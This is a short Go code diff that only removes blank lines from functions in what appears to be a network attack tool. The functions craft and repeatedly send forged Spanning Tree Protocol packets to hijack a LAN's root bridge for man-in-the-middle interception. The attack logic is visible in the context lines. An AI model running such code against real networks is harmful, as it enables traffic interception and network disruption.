@@ -44,7 +44,6 @@ func StpRootBridgeMitM(iface1 string) {
 }
 
 func stpRootBridgeHijack(iface string, params map[string]interface{}) {
-
 	rootID := params["rootid"].(uint16)
 	bridgeID := params["bridgeid"].(uint16)
 	bridgeMAC := params["bridgemac"].(string)
@@ -53,9 +52,7 @@ func stpRootBridgeHijack(iface string, params map[string]interface{}) {
 	Dot3Layer := packet.Dot3Layer()
 	Dot3Layer.SetDstMAC("01:80:c2:00:00:00")
 	Dot3Layer.SetSrcMAC(bridgeMAC)
-
 	LLCLayer := packet.LLCLayer()
-
 	stpLayer := packet.STPLayer()
 	stpLayer.Layer().TC = true
 	stpLayer.Layer().PortID = 0x8002
@@ -65,10 +62,8 @@ func stpRootBridgeHijack(iface string, params map[string]interface{}) {
 	stpLayer.SetBridgeID(bridgeID)
 
 	pkt, _ := packet.CraftPacket(Dot3Layer.Layer(), LLCLayer.Layer(), stpLayer.Layer())
-
 	for {
 		pkt2 := communication.SendRecv(pkt, iface)
-
 		stpResponse := utils.GetSTPLayer(pkt2)
 		if stpResponse != nil {
 			Dot3Layer := packet.Dot3Layer()
